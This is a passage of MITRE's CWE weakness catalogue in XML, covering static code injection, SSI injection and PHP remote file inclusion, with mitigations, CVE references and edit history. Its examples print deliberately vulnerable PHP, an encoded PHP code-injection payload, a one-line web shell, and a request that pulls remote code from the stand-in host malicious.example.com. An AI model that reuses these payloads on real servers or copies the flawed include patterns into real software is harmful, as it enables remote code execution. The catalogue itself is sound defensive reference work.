         <Description>The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before inserting the input into an executable resource, such as a library, configuration file, or template.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="94" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="PHP" Prevalence="Undetermined"/>
            <Language Name="Perl" Prevalence="Undetermined"/>
            <Language Class="Interpreted" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This issue is most frequently found in PHP applications that allow users to set configuration variables that are stored within executable PHP files. Technically, this could also be performed in some compiled code (e.g. by byte-patching an executable), although it is highly unlikely.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The injected code could access restricted data / files.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>In some cases, injectable code controls authentication; this may lead to a remote vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Injected code can access resources that the attacker is directly prevented from accessing.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Often the actions performed by injected control code are unlogged.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>Perform proper output validation and escaping to neutralize all code syntax from data written to code files.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-32">
               <Intro_Text>This example attempts to write user messages to a message file and allow users to view them.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$MessageFile = "messages.out";<xhtml:br/>if ($_GET["action"] == "NewMessage") {<xhtml:div style="margin-left:1em;">$name = $_GET["name"];<xhtml:br/>$message = $_GET["message"];<xhtml:br/>$handle = fopen($MessageFile, "a+");<xhtml:br/>fwrite($handle, "&lt;b&gt;$name&lt;/b&gt; says '$message'&lt;hr&gt;\n");<xhtml:br/>fclose($handle);<xhtml:br/>echo "Message Saved!&lt;p&gt;\n";</xhtml:div>}<xhtml:br/>else if ($_GET["action"] == "ViewMessages") {<xhtml:div style="margin-left:1em;">include($MessageFile);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>name=h4x0r<xhtml:br/>message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E</xhtml:div>
               </Example_Code>
               <Body_Text>which will decode to the following:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>&lt;?php system("/bin/ls -l");?&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages.</Body_Text>
               <Body_Text>Notice that XSS (CWE-79) is also possible in this situation.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-0495</Reference>
               <Description>Perl code directly injected into CGI library file from parameters to another CGI program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0495</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1876</Reference>
               <Description>Direct PHP code injection into supporting template file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1876</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1894</Reference>
               <Description>Direct code injection into PHP script that can be accessed by attacker.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1894</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0395</Reference>
               <Description>PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0395</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6652</Reference>
               <Description>chain: execution after redirect allows non-administrator to perform static code injection.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-6652</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Direct Static Code Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted Input to Command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="35"/>
            <Related_Attack_Pattern CAPEC_ID="73"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">"HTML injection" (see CWE-79: XSS) could be thought of as an example of this, but the code is injected and executed on the client side, not the server side. Server-Side Includes (SSI) are an example of direct static code injection.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Enabling_Factors_for_Exploitation, Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Direct Static Code Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Insufficient Control of Directives in Statically Saved Code (Static Code Injection)</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-04-05">Improper Sanitization of Directives in Statically Saved Code ('Static Code Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="97" Name="Improper Neutralization of Server-Side Includes (SSI) Within a Web Page" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product generates a web page, but does not neutralize or incorrectly neutralizes user-controllable input that could be interpreted as a server-side include (SSI) directive.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="96" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Server-Side Includes (SSI) Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>36</Entry_ID>
               <Entry_Name>SSI Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="101"/>
            <Related_Attack_Pattern CAPEC_ID="35"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">This can be resultant from XSS/HTML injection because the same special characters can be involved. However, this is server-side code execution, not client-side.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Name, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Server-Side Includes (SSI) Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Failure to Sanitize Server-Side Includes (SSI) Within a Web Page</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="98" Name="Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in "require," "include," or similar functions.</Description>
         <Extended_Description>In certain versions and configurations of PHP, this can allow an attacker to specify a URL to a remote location from which the product will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="829" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="94" View_ID="1000"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="426" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="PHP" Prevalence="Often"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Remote file include</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>RFI</Term>
               <Description>The Remote File Inclusion (RFI) acronym is often used by vulnerability researchers.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Local file inclusion</Term>
               <Description>This term is frequently used in cases in which remote download is disabled, or when the first part of the filename is not under the attacker's control, which forces use of relative path traversal (CWE-23) attack techniques to access files that may contain previously-injected PHP code, such as web access logs.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>The attacker may be able to specify arbitrary code to be executed from a remote location. Alternatively, it may be possible to use normal program behavior to insert php code into files on the local machine which can then be included and force the code to execute since php ignores everything in the file except for the content between php specifiers.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>Manual white-box analysis can be very effective for finding this issue, since there is typically a relatively small number of include or require statements in each program.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>The external control or influence of filenames can often be detected using automated static analysis that models data flow within the product.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. If the program uses a customized input validation library, then some tools may allow the analyst to create custom signatures to detect usage of those routines.</xhtml:p>
               </Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent lists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-34">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</xhtml:p>
                  <xhtml:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Develop and run your code in the most recent versions of PHP available, preferably PHP 6 or later. Many of the highly risky features in earlier PHP interpreters have been removed, restricted, or disabled by default.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>
                  <xhtml:p>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</xhtml:p>
                  <xhtml:p>Often, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Set allow_url_fopen to false, which limits the ability to include files from remote locations.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>Be aware that some versions of PHP will still accept ftp:// and other URI schemes. In addition, this setting does not protect the code from path traversal attacks (CWE-22), which are frequently successful against the same vulnerable code that allows remote file inclusion.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code, victim.php, attempts to include a function contained in a separate PHP page on the server. It builds the path to the file by using the supplied 'module_name' parameter and appending the string '/function.php' to it.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$dir = $_GET['module_name'];<xhtml:br/>include($dir . "/function.php");</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with the above code is that the value of $dir is not restricted in any way, and a malicious user could manipulate the 'module_name' parameter to force inclusion of an unanticipated file. For example, an attacker could request the above PHP page (example.php) with a 'module_name' of "http://malicious.example.com" by using the following request string:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>victim.php?module_name=http://malicious.example.com</xhtml:div>
               </Example_Code>
               <Body_Text>Upon receiving this request, the code would set 'module_name' to the value "http://malicious.example.com" and would attempt to include http://malicious.example.com/function.php, along with any malicious code it contains.</Body_Text>
               <Body_Text>For the sake of this example, assume that the malicious version of function.php looks like the following:</Body_Text>
               <Example_Code Nature="Bad">
                  <xhtml:div>system($_GET['cmd']);</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker could now go a step further in our example and provide a request string as follows:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>victim.php?module_name=http://malicious.example.com&amp;cmd=/bin/ls%20-l</xhtml:div>
               </Example_Code>
               <Body_Text>The code will attempt to include the malicious function.php file from the remote site. In turn, this file executes the command specified in the 'cmd' parameter from the query string. The end result is an attempt by tvictim.php to execute the potentially malicious command, in this case:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>/bin/ls -l</xhtml:div>
               </Example_Code>
